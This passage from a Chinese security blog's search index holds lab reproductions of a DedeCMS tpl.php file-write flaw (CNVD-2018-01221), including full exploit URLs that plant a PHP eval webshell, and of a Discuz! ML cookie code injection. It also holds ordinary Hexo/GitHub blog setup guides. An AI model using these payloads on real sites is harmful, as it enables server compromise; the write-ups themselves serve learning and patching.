所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，        导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了</code></pre><p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p><hr><h1 id="三-、漏洞复现"><a href="#三-、漏洞复现" class="headerlink" title="三 、漏洞复现"></a>三 、漏洞复现</h1><p>获取token，访问 域名 + /dede/tpl.php?action=upload<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104103.png" alt><br>然后查看网页源代码，找到token<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104145.png" alt><br>构造payload如下<br><a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</a><br>访问了成功写入<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104653.png" alt><br>访问写入的文件，域名+include/taglib/（你上传的文件名）.lib.php<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104810.png" alt><br>也可以构造一句话木马payload，<a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</a><br>直接用菜刀连接<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724105245.png" alt></p><hr><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然这个漏洞很鸡肋，需要拿到管理员账号密码才行，但还是有必要复现了解，反复练习才能有进步。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01221" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://blog.csdn.net/qq_41954384/article/details/93057317" target="_blank" rel="noopener">dedeCMS后台代码执行漏洞-CNVD-2018-01221</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> dedecms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz ML! V3.X 代码注入漏洞复现</title>
      <link href="/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，<br>攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，<br>进行远程代码执行利用，该漏洞利用方式简单，危害性较大。<br>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p><p><strong>漏洞影响版本：</strong><br>Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3 product of codersclub.org</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建Discuz！ML 环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724113043.png" alt></p><p>在主页进行抓包，修改Language的值，添加  <code>&#39;.phpinfo().&#39;</code><br>成功复现该漏洞<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724114153.png" alt></p><hr><h1 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h1><p>由于代码包含的原因，所以注入到缓存文件中的恶意代码直接执行，其中首页就有包涵，<br>全局搜索一下的话，应该有不少地方有进行包含可以直接利用，危害很大。<br>VulkeyChen师傅的建议：单看语言这个点，在/source/class/discuz/discuz_application.php<br>第338行之后341行之前加入该代码暂缓此安全问题：</p><pre><code>$lng = str_replace(&quot;(&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;)&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;&#39;&quot;,&quot;&quot;,$lng);$lng = str_replace(&#39;&quot;&#39;,&quot;&quot;,$lng);$lng = str_replace(&#39;`&#39;,&quot;&quot;,$lng);</code></pre><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://blog.topsec.com.cn/discuz-ml-v3-x-代码注入漏洞深度分析/" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a><br><a href="https://www.cnblogs.com/-mo-/p/11180396.html" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github分支备份hexo</title>
      <link href="/2019/07/05/github-fen-zhi-bei-fen-hexo/"/>
      <url>/2019/07/05/github-fen-zhi-bei-fen-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>使用hexo搭建个人博客框架，配置起来有些消耗时间，管理起来也不是特别方便。特别是有时需要在其他电脑上写博客时，就让人头疼。所以我们就利用Github的分支，来备份hexo，方便快速搭上手写博客。</p><hr><h1 id="二、创建本地分支目录"><a href="#二、创建本地分支目录" class="headerlink" title="二、创建本地分支目录"></a>二、创建本地分支目录</h1><h2 id="1-新建文件夹存放分支工作目录。"><a href="#1-新建文件夹存放分支工作目录。" class="headerlink" title="1. 新建文件夹存放分支工作目录。"></a>1. 新建文件夹存放分支工作目录。</h2><p><code>mkdir hexo</code></p><h2 id="2-把你的GitHub的远程仓库克隆到hexo文件夹"><a href="#2-把你的GitHub的远程仓库克隆到hexo文件夹" class="headerlink" title="2. 把你的GitHub的远程仓库克隆到hexo文件夹"></a>2. 把你的GitHub的远程仓库克隆到hexo文件夹</h2><p><code>git clone https://github.com/yourusername/yourusername.github.io hexo</code></p><h2 id="3-删除除了版本管理的-git之外的所有文件和文件夹"><a href="#3-删除除了版本管理的-git之外的所有文件和文件夹" class="headerlink" title="3. 删除除了版本管理的.git之外的所有文件和文件夹"></a>3. 删除除了版本管理的.git之外的所有文件和文件夹</h2><pre><code>cd hexorm -r *</code></pre><h2 id="4-把要备份的文件复制到hexo目录"><a href="#4-把要备份的文件复制到hexo目录" class="headerlink" title="4. 把要备份的文件复制到hexo目录"></a>4. 把要备份的文件复制到hexo目录</h2><pre><code>scaffolds/source/themes/.git/.gitignore_config.ymlpackage.json</code></pre><blockquote><p>注意：<br>如果使用的主题是从Github克隆的，那么使用命令删除它的Git文件（以next主题为例）<br><code>rm -R themes/next/.git*</code></p></blockquote><hr><h1 id="三、创建分支"><a href="#三、创建分支" class="headerlink" title="三、创建分支"></a>三、创建分支</h1><h2 id="1-新建仓库"><a href="#1-新建仓库" class="headerlink" title="1. 新建仓库"></a>1. 新建仓库</h2><p>在blog项目仓库下，输入备份分支hexo，点击create创建（因为我已经创建过了，所以显示的不一样）<br>或者在本地使用命令 <code>git checkout -b hexo</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705133032.png" alt></p><h2 id="2-点击设置，把默认分支设置为新建的备份分支"><a href="#2-点击设置，把默认分支设置为新建的备份分支" class="headerlink" title="2. 点击设置，把默认分支设置为新建的备份分支"></a>2. 点击设置，把默认分支设置为新建的备份分支</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132053.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132123.png" alt></p><hr><h1 id="四、提交备份"><a href="#四、提交备份" class="headerlink" title="四、提交备份"></a>四、提交备份</h1><p>在本地的hexo文件夹打开git bash，依次执行以下命令：</p><pre><code>git add -all   #保存所有文件到暂存区git commit -m &quot;创建hexo分支&quot; #提交变更git push --set-upstream origin hexo#推送到Github，并用`--set-upstream`与origin创建关联#将hexo设置为默认分区</code></pre><hr><h1 id="五、合并管理"><a href="#五、合并管理" class="headerlink" title="五、合并管理"></a>五、合并管理</h1><p>将本地hexo分支中的.git文件夹复制到博客根目录中，<br>我们只需要手动管理hexo分支中的文件（备份），<br>.gitignore之外的文件由hexo管理（hexo d）<br>移除主题目录下的Git管理文件</p><p><code>rm -R themes/next/.git* #以next主题为例</code></p><p>master分支的文件则由hexo管理，编辑hexo配置文件<em>_config.yml</em></p><pre><code>deploy:        type: git        repo: https://github.com/yourusername/yourusername.github.io        branch: master</code></pre><hr><h1 id="六、发表文章及修改配置"><a href="#六、发表文章及修改配置" class="headerlink" title="六、发表文章及修改配置"></a>六、发表文章及修改配置</h1><h2 id="1-将相关更改（配置修改或发表文章）推送到hexo分支"><a href="#1-将相关更改（配置修改或发表文章）推送到hexo分支" class="headerlink" title="1. 将相关更改（配置修改或发表文章）推送到hexo分支"></a>1. 将相关更改（配置修改或发表文章）推送到hexo分支</h2><pre><code>git add .git commit -m &quot;修改配置/发表文章&quot;git push origin hexo</code></pre><h2 id="2-将静态文件推送到master分支"><a href="#2-将静态文件推送到master分支" class="headerlink" title="2. 将静态文件推送到master分支"></a>2. 将静态文件推送到master分支</h2><pre><code>hexo clean hexo ghexo d</code></pre><hr><h1 id="七、迁移"><a href="#七、迁移" class="headerlink" title="七、迁移"></a>七、迁移</h1><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><pre><code>npm install -g hexo-clihexo initnpm install</code></pre><h2 id="2-克隆hexo分支"><a href="#2-克隆hexo分支" class="headerlink" title="2. 克隆hexo分支"></a>2. 克隆hexo分支</h2><p><code>git clone -b hexo https://github.com/username/username.github.io</code></p><hr><p>这样就可以进行写作了，写完记得同步备份博客。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990" target="_blank" rel="noopener">【GitHub】创建Git分支将Hexo博客迁移到其它电脑</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> hexo </tag>
            
            <tag> 备份 </tag>
            
            <tag> 分支 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages+Hexo搭建个人博客（踩坑之路）</title>
      <link href="/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/"/>
      <url>/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实很早之前就想搭建一个个人博客，出于各种原因，一直没有行动。最近终于着手开始搭建，希望自己可以一直坚持下去。在搭建的过程中，踩了不少坑，特此记录，也希望对后来人有一点点参考价值。</p><hr><h1 id="一、Github"><a href="#一、Github" class="headerlink" title="一、Github"></a>一、Github</h1><h2 id="1-注册Github账号"><a href="#1-注册Github账号" class="headerlink" title="1. 注册Github账号"></a>1. 注册Github账号</h2><p>进入<a href="https://github.com" target="_blank" rel="noopener">Github</a>官网，注册账号。</p><h2 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2. 创建仓库"></a>2. 创建仓库</h2><p>点击首页右上角头像左侧的头像<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705010509.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011051.png" alt></p><h2 id="3-Github-Pages"><a href="#3-Github-Pages" class="headerlink" title="3. Github Pages"></a>3. Github Pages</h2><p>点击Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011609.png" alt><br>找到GitHub Pages，以用户名命名的仓库自动开启github pages，确认开启后就可以通过给出的网址访问了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011514.png" alt></p><hr><h1 id="二、Hexo"><a href="#二、Hexo" class="headerlink" title="二、Hexo"></a>二、Hexo</h1><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>是一个快速、简洁且高效的博客框架，可以参考官方文档。</p><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><p>要使用hexo，必须安装<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a>和<a href="https://git-scm.com/download/" target="_blank" rel="noopener">Git</a>。网上教程很多，这里不再赘述。</p><h2 id="2-hexo安装"><a href="#2-hexo安装" class="headerlink" title="2. hexo安装"></a>2. hexo安装</h2><p>先创建存放blog文件的文件夹，切换到此文件夹右击git bash打开<br>输入命令安装hexo：<br><code>npm install -g hexo-cli</code></p><p>依次执行：</p><pre><code>hexo init npm installhexo g #生成静态网页hexo s #启动本地服务</code></pre><p>完成后，在浏览器输入localhost:4000就可以看到你的博客了</p><hr><h1 id="三、部署到Github"><a href="#三、部署到Github" class="headerlink" title="三、部署到Github"></a>三、部署到Github</h1><h2 id="1-设置SSH"><a href="#1-设置SSH" class="headerlink" title="1. 设置SSH"></a>1. 设置SSH</h2><p>返回GIt Bash中，依次输入：</p><pre><code>git config --global.name &quot;yourname&quot;git config --global.email &quot;youremail&quot;</code></pre><p>这里的yourname输入你的Github的用户名，<br>youremail输入你的Github邮箱</p><pre><code>cd ~/.sshlsmkdir key_backupcp id_rsa* key_backuprm id_rsa*#检查有没有生成过SSH并备份移除ssh-keygen -t rsa -C &quot;youremail&quot; #生成新的SSH，接下来输入密码 一路回车</code></pre><h2 id="2-添加SSH-Key到Github"><a href="#2-添加SSH-Key到Github" class="headerlink" title="2.添加SSH Key到Github"></a>2.添加SSH Key到Github</h2><p>点击头像，选择Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022259.png" alt><br>添加新的SSH Key<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022426.png" alt><br>找到c:\users\当前用户名.ssh    文本形式打开id_ras.pub (打开系统查看隐藏文件选项)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022656.png" alt><br>测试是否连接成功<br><code>ssh -T git@github.com</code><br>输入yes就ok</p><h2 id="3-部署到Github"><a href="#3-部署到Github" class="headerlink" title="3. 部署到Github"></a>3. 部署到Github</h2><p>打开hexo配置文件（根目录）<strong>_config.yml</strong><br>翻到最后将xxx修改为你的Github账户（冒号后面有一个空格）</p><pre><code>deploy:    type: git    repo: https://github.com/xxx/xxx.github.io.git    branch: master</code></pre><p>然后安装deploy-git(不然报错”ERROR Deployer not found: git“)<br><code>npm install hexo-deployer-git --save</code></p><p>然后</p><pre><code>hexo cleanhexo ghexo d</code></pre><p>deploy时可能要你输入密码，再刷新username.github.io就可以看到你的blog。</p><hr><p><strong>注意：</strong></p><blockquote><p>如果输入命令的过程中出现了”LF will be replaced by CRLF”报错，<br>    1. windows中的换行符为 CRLF，而在Linux下的换行符为LF，所以在执行add . 时出现提示<br>    2. CRLF和LF是两种不同的换行格式，git工作区默认为CRLF来作为换行符，<br>        所以当我们项目文件里有用的地方使用LF作为换行符，这个时候我们再继续git add<br>        或者git commit的时候就会弹出警告，当最终push到远程仓库的时候git会统一格式全部转化为用CRLF作为换行符 </p></blockquote><p><strong>解决办法：</strong></p><blockquote><ol><li>这个只是一个警告，我们直接忽略就好。</li><li>git config –global core.autocrlf false  //禁用自动转换 </li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
